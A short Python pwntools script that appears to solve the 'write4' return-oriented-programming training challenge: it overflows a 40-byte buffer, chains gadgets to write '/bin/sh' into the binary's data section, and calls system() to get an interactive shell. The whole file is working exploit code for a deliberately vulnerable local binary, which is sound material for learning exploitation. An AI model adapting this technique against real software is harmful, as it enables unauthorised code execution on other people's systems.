from pwn import *

context.log_level = 'DEBUG'
binary = './write4'
context.binary = binary
p = process(binary)

mov_r15_r14 = 0x400820
pop_r14_r15 = 0x400890
pop_rdi = 0x400893
data = 0x00601050
system = 0x4005e0

layout = [
	'a'*40,
	pop_r14_r15,data,'/bin/sh\x00',
	mov_r15_r14,
	pop_rdi,data,
	system
]
rop = flat(layout)

p.recv()
p.sendline(rop)
p.interactive()